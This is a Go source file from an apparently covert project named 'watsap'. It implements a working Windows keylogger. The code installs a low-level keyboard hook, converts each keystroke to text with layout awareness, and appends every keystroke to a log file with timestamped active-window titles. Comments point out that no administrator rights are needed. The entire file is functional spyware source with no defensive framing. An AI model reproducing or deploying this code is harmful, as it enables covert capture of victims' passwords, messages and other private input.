//go:build windows
// +build windows

package keylog

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"
	"watsap/utils/config"
)

// --- Windows API Definitions ---

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	// Hook functions
	procSetWindowsHookExA   = user32.NewProc("SetWindowsHookExA")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")

	// Key processing functions
	procToUnicode                = user32.NewProc("ToUnicode")
	procGetKeyState              = user32.NewProc("GetKeyState")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
	WM_SYSKEYDOWN  = 260 // For Alt keys
)

// Low-Level Keyboard Hook Structure
type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// Global variable to hold the hook handle
var keyboardHook HHOOK
var lastWindow string

type HHOOK uintptr

// --- Core Logic ---

// InitKeyboard starts the event-driven keylogger
func InitKeyboard() {
	// Open file in Append mode
	f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[Keylog] Error opening file: %v", err)
		return
	}
	f.Close() // Close immediately, we open/close on write or keep it open depending on strategy.
	// For robustness, we will open inside the processing or use a channel.
	// To keep it simple and crash-proof, we'll write per key stroke.

	log.Println("[Keylog] Starting Hook (No Admin Required for User Apps)...")

	// 1. Set the Hook
	// We pass 0 as module handle because usually for WH_KEYBOARD_LL logic,
	// GetModuleHandle(0) is sufficient in Go runtime.
	hook, _, err := procSetWindowsHookExA.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(lowLevelKeyboardProc),
		0,
		0,
	)

	if hook == 0 {
		log.Printf("[Keylog] Failed to set hook: %v", err)
		return
	}
	keyboardHook = HHOOK(hook)

	// 2. Message Loop (Required for Hooks to work)
	var msg struct {
		Hwnd    uintptr
		Message uint32
		WParam  uintptr
		LParam  uintptr
		Time    uint32
		Pt      struct{ X, Y int32 }
	}

	// This loop blocks and waits for OS messages. It consumes almost 0 CPU.
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
		// Dispatch message (not strictly needed for just hooking, but good practice)
		// procTranslateMessage.Call(...)
		// procDispatchMessage.Call(...)
	}

	// 3. Cleanup
	procUnhookWindowsHookEx.Call(uintptr(hook))
}

// lowLevelKeyboardProc is the callback triggered by Windows for EVERY key press
func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	// nCode >= 0 means we should process it.
	// wParam tells us if it's a KeyDown event.
	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		kbd := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))

		// Process the key asynchronously to avoid blocking the input chain
		// (Though simple file writing is fast enough usually)
		handleKey(kbd.VkCode, kbd.ScanCode)
	}

	// ALWAYS pass the event to the next hook, otherwise the keyboard will freeze.
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func handleKey(vkCode uint32, scanCode uint32) {
	// Check active window title to add context
	checkActiveWindow()

	// 1. Prepare Keyboard State (256 bytes)
	// This fixes the Shift/Caps/AltGr issues. We manually build the state.
	var state [256]byte

	// Helper to set state bit if key is down/toggled
	setKey := func(vk int) {
		s, _, _ := procGetKeyState.Call(uintptr(vk))
		// High-order bit = Key is Down, Low-order bit = Toggled (CapsLock)
		state[vk] = byte(s)
	}

	// Capture state of modifier keys
	setKey(0x10) // VK_SHIFT
	setKey(0x11) // VK_CONTROL
	setKey(0x12) // VK_MENU (Alt)
	setKey(0x14) // VK_CAPITAL (CapsLock)
	setKey(0xA5) // VK_RMENU (AltGr - Right Alt)

	// 2. Convert to Unicode
	var buffer [2]uint16

	// Get keyboard layout of the current foreground thread for accurate mapping
	// (e.g. if user is in a Turkish window vs English window)
	hwnd, _, _ := procGetForegroundWindow.Call()
	pid, _, _ := procGetWindowThreadProcessId.Call(hwnd, 0)
	layout, _, _ := procGetKeyboardLayout.Call(pid)

	ret, _, _ := procToUnicode.Call(
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(2), // Buffer size
		uintptr(0), // Flags
		layout,     // Keyboard Layout (Important for Turkish chars)
	)

	// 3. Log Logic
	f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	if ret > 0 {
		// Visible Character
		char := syscall.UTF16ToString(buffer[:ret])
		// Replace common control chars with readable tags
		switch vkCode {
		case 0x0D: // Enter
			f.WriteString("\n")
		case 0x08: // Backspace
			f.WriteString("[BS]")
		case 0x09: // Tab
			f.WriteString("[TAB]")
		default:
			f.WriteString(char)
		}
	} else {
		// Non-printable keys (optional, can be commented out to save space)
		/*
			switch vkCode {
			case 0x20: f.WriteString(" ")
			case 0x25: f.WriteString("[LEFT]")
			case 0x27: f.WriteString("[RIGHT]")
			// ... add more if needed
			}
		*/
	}
}

// checkActiveWindow logs the window title if it changes
func checkActiveWindow() {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return
	}

	const maxCount = 256
	buf := make([]uint16, maxCount)
	len, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(maxCount))

	if len > 0 {
		title := syscall.UTF16ToString(buf[:len])
		if title != lastWindow {
			lastWindow = title

			f, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err == nil {
				timestamp := time.Now().Format("2006-01-02 15:04:05")
				f.WriteString(fmt.Sprintf("\n\n--- [%s] %s ---\n", timestamp, title))
				f.Close()
			}
		}
	}
}
